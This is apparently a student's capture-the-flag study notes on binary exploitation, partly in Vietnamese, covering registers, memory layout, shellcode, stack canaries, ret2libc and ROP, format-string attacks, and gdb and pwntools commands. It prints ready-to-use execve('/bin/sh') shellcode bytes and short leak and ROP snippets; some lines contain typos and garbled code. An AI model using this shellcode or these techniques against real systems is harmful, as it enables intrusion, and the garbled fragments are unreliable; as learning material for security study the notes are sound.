# pwn
Studying..
***COMPUTER ARCHITECTURE***
    
    rax (accumulator register): Return value of a function                                                  rax eax ax ah al (64 32 16 8 8)
    rbx (base register): No primary use on x64                                                              
    rcx (counter register): Loop count for loop statement, or execution count for various operations
    rdx (data register): No primary use on x64
    rsi (source index): Pointer to the source when moving data
    rdi (destination index): Pointer to the destination when moving data
    rsp (stack pointer): Pointer to the location of the stack in use
    rbp (stack base pointer): Pointer to the bottom of the stack


***MEMORY STRUCTURE OF LINUX PROCESS***
    
    Code Segment: the area where the executable machine code is located, and is also known as the text segment. (r--x)
    Data segemnt: contains global vars (rw-)
    BSS segment(Block Started by Symbol): area of memory where global variables that do not have a value at compile time, = 0 when start. (rw-)
    Stack segment:area where the process' stack is located. (rw-)
    Heap segment: a segment where heap data is located (cấp phát bộ nhớ động). (rw-)
    Extra segment.
    Fs and Gs are registers without predefined purposes, allowing the operating system to use them arbitrarily .


**ASSEMBLY***
    
    Opcode
        Data Transfer: mov, lea
        Arithmetic: inc, dec, add, sub
        Logical: and, or, xor, not
        Comparison: cmp, test
        Branch: jmp, je, jg
        Stack: push, pop
        Procedure: call, ret, leave
        System call: syscall
    
    Memory operands
        QWORD PTR [0x8048000]: 8 bytes
        DWORD PTR [0x8048000]: 4 bytes
        WORD PTR [rax]: 2 bytes


**SHELLCODE***
    
    execve("/bin/sh", null, null)
    syscall     rax     arg0 (rdi)              arg1 (rsi)                  arg2 (rdx)
    execve      0x3b    const char *filename    const char *const *argv     const char *const *envp
        mov rax, 0x68732f6e69622f(/bin/sh)
        push rax
        mov rdi, rsp  ; rdi = "/bin/sh\x00"
        xor rsi, rsi  ; rsi = NULL
        xor rdx, rdx  ; rdx = NULL
        mov rax, 0x3b ; rax = sys_execve
        syscall       ; execve("/bin/sh", null, null)
    x86 
        xor eax, eax
        xor ecx, ecx
        xor edx, edx
        add eax, 0x0b
        xor ebx, ebx
        push ebx
        push 0x68732f2f
        push 0x6e69622f
        mox ebx, esp 
        int 0x80 // syscall
    # execve /bin/sh shellcode: 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"


***BUFFER OVERFLOW***
    
    gets(buf): no limit input
                received until "\n" but don't received "\n"
                add "\0" at the end of input
    scanf("%s", buf): no limit input
                received until " "
                same as gets
    scanf("%[width]s", buf):  
                Reads up to `width` characters; if `width > size(buf) - 1`, overflow may occur.  
                Does not guarantee null termination.  
    fgets(buf, len, stream):  
                Reads up to `len - 1` characters; if `len > size(buf)`, overflow may occur.  
                Always null-terminates the buffer.  
                Pads with `\0` if input is shorter than `len`.  
                If input equals `len`, discards the last byte and adds `\0`.  
                May lose data: A 30-byte buffer stores only 29 bytes if `len = 30`.  
                Stores `"\n\0"` if space allows.  
    Stack overflow
    Heap overflow(malloc, calloc)


**CANARY***
    
    ANTI buffer overflow -> Segmentation fault
    [rbp-0x8]
    Random 8 bytes start with a null byte
    Leak Canary
        buf = b'A'*0x39
        p.sendafter(b'Buf: ', buf)
        p.recvuntil(buf)
        cnry = u64(b'\x00' + p.recvn(7))
        slog('canary', cnry)


***NX & ASLR***
    
    No-eXecute (NX): anti shellcode
    Address Space Layout Randomization (ASLR): assigns the stack, heap, shared libraries, etc. to random addresses each time the binary is executed
    RELocation Read-Only (RELRO)
        no: GOT overwrite
        partial: got.plt -> read-only
        full: anti GOT
    => Hook Overwrite: Bypassing RELRO: overwrite function pointers(malloc(), free(), realloc()) with an arbitrary function address to execute malicious code.

***R2L-ROP***
    
    r2l: sử dụng ret để chạy hàm có trong libc => system("/bin/sh")
    ROP: sử dụng ret và các ROP gadget để điều khiển luồng thực thi của chương trình
    GOT(address): global offset table -> nơi chứa địa chỉ các hàm libc(put)
    PLT: procedure linkage table -> thực thi hàm chứa trong GOT
    Return address dc cấp 16 bytes -> chèn thêm ret trước pop rdi ; ret (prevent errors caused by movaps)
    system = read - 0xc3c20 # readelf -s libc.so.6 | grep "read@"
    ROP gadget --binary filename | grep "gadget" (pop rdi ; ret)
        e.got[' ']
        e.plt[' ']

    libc base: random do ASLR
    offset: cố định với mỗi libc, khoảng cách từ libc_base tới địa chỉ của hàm cần tìm
    địa chỉ -> rdi : hàm put in ra toàn bộ dữ liệu bên trong con trỏ
        Ex: leak libc address with puts -> pop rdi
                                     puts@got   <=>  puts(puts@got)
                                     puts@plt
            libc_base = puts_leaked_address - offset_of_puts_in_libc(libc.symbols['puts])
            system = libc_base + system_offset
            binsh = sh + lb
            get shell : rop rdi
                        /bin/sh  <=> system("/bin/sh")
                        system

            x86 :
                read(0,writableArea,len(str(binsh)))
                write(1,read_got,len(str(read_got)))
                read(0,read_got,len(str(read_got)))
                system(writableArea)


***PIE & RELRO***
    
    Position-Independent Executable (PIE): change address of the program
    Position-Independent Code (PIC):  Code that can run correctly regardless of where it is mapped in memory. It avoids using absolute addresses and typically relies on relative addresses, often based on rip.


***OUT OF BOUNDS***
    
    OOB occurs when the index value used to reference an element is negative or outside the length of the array. 
    Access arr: &arr[k] = arr + sizeof(elem)*k


***FORMAT STRING***
    
    printf("%s", input) => in ra chuỗi input
    printf("%s") => in ra giá trị tại địa chỉ thứ 1 trên stack
    CHỉ định tham số $
    printf("%30$s") => in ra giá trị tại địa chỉ thứ 30 trên stack
    printf("%6$p") => in ra giá trị dạng hex tại địa chỉ thứ 6 trên stack 0x
    printf("%6$x") => in ra giá trị dạng hex tại địa chỉ thứ 6 trên stack không có 0x
    Sử dụng format string "%p", "%x", "%d", "%*\n" để leak các giá trị trong stack
    Sử dụng format string "%s" để in ra giá trị của flag trong vùng nhớ của chương trình
    Sử dụng format string "%n", "%hn", "%hhn" để thay đổi giá trị của 1 vùng nhớ có quyền ghi
    32bit: In dữ liệu trên stack
    64bit: 5% đầu: 5 thanh ghi(rsi->rdx->rxd->r8->r9), từ 6 trở đi là in trên stack(rsp->rsp+0x8->rsp+0x10->rsp+0x18)


***DEBUG***
    
    checksec
        Canary: anti buffer overflow (rbp-0x8)
        NX (Non-Executable): anti Shellcode
        PIE (Position Independent Executable): change address of the program
        RELRO (RELocation Read-Only): No -> Vulnerable to GOT overwrite
    start
    disass main : disassemble main
    vmmap : shows the layout of the virtual memory
    r : run
    b *address : set breakpoint
    del <breakpoint> 
    c : continue
    si: step into
    ni: next instruction
    i: info
    k: kill
    bt: backtrace
    pd: pdisas
    examine: x/<tham số> <địa chỉ>  wx (word hexa), bx (byte hexa), 4i (4 instructions), s ( string )
    RSP (64-bit) / ESP (32-bit): Stack Pointer
    RIP (64-bit) / EIP (32-bit): Instruction Pointer (địa chỉ lệnh tiếp theo thực hiện)

***PWNTOOLS***
    
    #Process & Remote
    from pwn import *
    p = process('./filename')       //local
    p = remote('address', port)     //remote sever
    gdb.attach(p, api=True)         //debug
    
    #ELF
    e = ELF('./filename')
    libc = ELF("./libc.so.6")            
    e.plt['funcname']                //Get the plt address of the input function. 
    e.got['funcname']                //Get the got address of the input function. 
    e.symbols['funcname']           //Get the offset from the function base address of the input function. 
    libc.symblos['funcname']
    list(libc.search(b'/bin/sh'))[0] //shell

    # Packing Unpacking
    p64(numeric value)    //Packs the value into 64-bit (8-byte).       p: convert int/hex to little-endian
    p32 (numeric value)   //Packs the value into 32- bit (4-byte). 
    u64 (string)          //Unpacks the string into 64- bit (8-byte).   u: convert little-endian to int/hex
    u32 (string)          //Unpacks the string into 32- bit (4-byte). 

    # Sending and receiving data
    p.send(b'A')  # Sends b'A' to ./test
    p.sendline(b'A')  # Sends b'A' followed by a newline to ./test
    p.sendafter(b'hello', b'A')  # Sends b'A' after ./test outputs b'hello'
    p.sendlineafter(b'hello', b'A')  # Sends b'A' followed by a newline after ./test outputs b'hello'
    
    p.recv(1024)  # Receives up to 1024 bytes of data from the process
    p.recvline()  # Receives data from the process until a newline character is encountered
    p.recvn(5)  # Receives exactly 5 bytes of data from the process
    p.recvuntil(b'hello')  # Receives data from the process until 'hello' is encountered
    p.recvall()  # Receives all data from the process until it terminates

    #Shellcode
    32bit: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
    64bit: "\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
    code = shellcraft.sh()   # Shellcode to spawn a shell
    shellcràt.cat() # cat filename
    machine_code = asm(code) # Assembles the shellcode into machine code
    
    #Print
    log.info

    #Interactive
    p.interactive()


***PWNINIT***
    
    export PATH="~/.cargo/bin:$PATH"
    pwninit: tự patch file 
    mv file_patch file: đổi tên

////////////////////////////////////////////
***START***
enter venv: source ~/ctf/bin/activate
exit venv: deactivate
cd "/mnt/d/My folder/Khoi/đại học/ctf"
